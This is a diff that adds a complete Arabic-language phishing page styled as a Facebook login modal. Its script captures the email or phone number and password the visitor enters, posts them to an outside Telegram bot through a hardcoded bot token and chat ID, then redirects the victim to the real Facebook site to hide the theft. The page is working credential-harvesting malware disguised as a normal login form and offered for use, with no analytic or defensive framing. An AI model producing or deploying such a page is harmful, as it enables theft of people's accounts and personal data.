@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook Login Clone</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: rgba(240,244,247,0.8);
+      direction: rtl;
+    }
+    #overlay {
+      background: rgba(255,255,255,0.85);
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    #loginModal {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 8px 38px rgb(0 0 0 / 0.15);
+      width: 360px;
+      max-width: 90vw;
+      padding: 28px 16px 24px 16px;
+      position: relative;
+    }
+    #closeBtn {
+      position: absolute;
+      top: 14px;
+      left: 14px;
+      width: 28px;
+      height: 28px;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+    }
+    #closeBtn svg {
+      width: 20px;
+      height: 20px;
+      stroke: #606770;
+      stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      transition: stroke 0.2s ease-in-out;
+    }
+    #closeBtn:hover svg {
+      stroke: #000;
+    }
+    #loginModal h2 {
+      font-weight: 700;
+      font-size: 20px;
+      color: #050505;
+      margin: 12px 0 20px 0;
+      text-align: center;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      height: 40px;
+      padding: 0 12px;
+      font-size: 15px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      outline-offset: 2px;
+      transition: border-color 0.2s ease-in-out;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #1877f2;
+      outline-color: #1877f2;
+    }
+    button[type="submit"] {
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 17px;
+      padding: 10px 0;
+      cursor: pointer;
+      transition: background-color 0.25s ease-in-out;
+    }
+    button[type="submit"]:hover {
+      background-color: #1565d8;
+    }
+    #forgotPassword {
+      text-align: center;
+      margin-top: 8px;
+      margin-bottom: 16px;
+      color: #1877f2;
+      font-weight: 600;
+      font-size: 13px;
+      cursor: pointer;
+    }
+    #forgotPassword:hover {
+      text-decoration: underline;
+    }
+    .divider-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 12px 0 14px 0;
+    }
+    .divider-container hr {
+      flex-grow: 1;
+      height: 1px;
+      background-color: #dddfe2;
+      border: none;
+    }
+    .divider-container span {
+      font-size: 14px;
+      font-weight: 500;
+      color: #616770;
+    }
+    #createAccountBtn {
+      background-color: #42b72a;
+      color: #fff;
+      border: none;
+      font-weight: 600;
+      font-size: 15px;
+      border-radius: 6px;
+      padding: 10px 0;
+      width: 100%;
+      cursor: pointer;
+      transition: background-color 0.25s ease-in-out;
+    }
+    #createAccountBtn:hover {
+      background-color: #36a420;
+    }
+  </style>
+</head>
+<body>
+  <div id="overlay">
+    <article id="loginModal">
+      <button id="closeBtn" aria-label="إغلاق">
+        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <line x1="18" y1="6" x2="6" y2="18"/>
+          <line x1="6" y1="6" x2="18" y2="18"/>
+        </svg>
+      </button>
+
+      <h2>عرض المزيد على فيسبوك</h2>
+
+      <form id="loginForm" autocomplete="off" novalidate>
+        <input id="emailOrPhone" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required />
+        <input id="password" type="password" placeholder="كلمة السر" required />
+        <button type="submit">تسجيل الدخول</button>
+      </form>
+
+      <div id="forgotPassword">هل نسيت كلمة السر؟</div>
+
+      <div class="divider-container">
+        <hr />
+        <span>أو</span>
+        <hr />
+      </div>
+
+      <button id="createAccountBtn" type="button">إنشاء حساب جديد</button>
+    </article>
+  </div>
+
+  <script>
+    const closeBtn = document.getElementById('closeBtn');
+    const overlay = document.getElementById('overlay');
+    closeBtn.addEventListener('click', () => {
+      overlay.style.display = 'none';
+    });
+
+    document.getElementById('forgotPassword').addEventListener('click', () => {
+      alert('سيتم توجيهك لاستعادة كلمة السر.');
+    });
+
+    document.getElementById('forgotPassword').addEventListener('keydown', (e) => {
+      if(e.key === 'Enter' || e.key === ' ') {
+        e.preventDefault();
+        document.getElementById('forgotPassword').click();
+      }
+    });
+
+    document.getElementById('createAccountBtn').addEventListener('click', () => {
+      alert('سيتم توجيهك لإنشاء حساب جديد.');
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('emailOrPhone').value;
+      const password = document.getElementById('password').value;
+
+      const message = `🛡️ محاولة تسجيل دخول:\n📧 البريد / الهاتف: ${email}\n🔑 كلمة السر: ${password}`;
+      
+      const token = '8084334500:AAE8vffVqa5ZS0InX4fc8jjtU16yHl2cZ14';
+      const chat_id = '5524792549';
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id, text: message })
+        });
+      } catch (err) {
+        console.error('فشل الإرسال إلى تيليجرام:', err);
+      }
+
+      // إعادة التوجيه إلى فيسبوك بعد الإرسال
+      window.location.href = "https://web.facebook.com/";
+    });
+  </script>
+</body>
+</html>
